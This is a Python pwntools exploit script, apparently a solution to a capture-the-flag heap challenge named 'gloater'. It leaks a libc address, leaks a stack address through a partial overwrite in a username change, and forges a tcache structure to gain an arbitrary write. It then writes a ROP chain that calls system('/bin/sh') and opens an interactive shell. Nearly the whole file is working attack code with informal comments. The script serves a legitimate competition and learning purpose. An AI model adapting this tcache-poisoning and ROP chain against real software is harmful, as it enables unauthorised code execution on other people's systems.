from pwn import *

elf = context.binary = ELF('./challenge/gloater')
libc = ELF('./libc-2.31.so')
p = remote('127.0.0.1', 9001)

def change_user(name):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'New User: ', name)
    p.recvuntil(b'Old User was ')
    return p.recvuntil(b'...', drop=True)

def create_taunt(target, description):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'target: ', target)
    p.sendlineafter(b'Taunt: ', description)

def remove_taunt(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

def set_super_taunt(idx, description):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'Taunt: ', str(idx).encode())
    p.sendlineafter(b'taunt: ', description)


# send...
p.sendlineafter(b'> ', b'A' * 0x10)             # send name 16 bytes
create_taunt(b'yes', b'no')                     # create a taunt
set_super_taunt(0, b'A'*0x88)                   # set the super taunt

p.recvuntil(b'A'*0x88)
leak = u64(p.recv(6) + b'\0\0')
libc.address = leak - libc.sym['puts']
log.success(f'LIBC Base: 0x{libc.address:x}')

# libc addr means squat
# because the pointer is never used to edit, just free
# and free is checked
# and tf are you gonna do by freeing an address in libc?
# ohhh actually you could free something? but nah, fully doubt, especially with only 1 name change

payload = b'A' * 4
payload += b'\x10\x10'          # brute 4th-last bit as a `1`
leak = change_user(payload)
leak = leak.split(b'A' * 0x10)[1]
leak += b'\0' * 2
leak = u64(leak)
log.success(f'Leak: 0x{leak:x}')

# array located at base + 0x40e0
pause()

# ... now free tcache
remove_taunt(0)

# fake tcache!
# tcache is size 0x290
# so we need to input 0x280 data
ret_addr = leak - 0x18
log.info(f'Writing to 0x{ret_addr:x}')

tcache_fake = p16(0) * 12           # pad it out...
tcache_fake += p16(1)               # 0xe0 bin...
tcache_fake += p16(0) * (64-12-1)   # rest of bins
tcache_fake += p64(0) * 12          # get to nice size
tcache_fake += p64(ret_addr)        # overwrite 0xe0 bin...!
tcache_fake = tcache_fake.ljust(0x280-1, b'\x00') # -1 for newline...

create_taunt(b'dontcare', tcache_fake)      # works!

# now to use arb write?
# have to use the 0xe0 bin!
rop = ROP(libc)

rop.raw(libc.address + 0x22679)
rop.system(next(libc.search(b'/bin/sh\0')))

payload = rop.chain()
payload = payload.ljust(0xd0, b'A')

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'target: ', b'nomatter')
pause()
p.sendlineafter(b'Taunt: ', payload)

p.interactive()
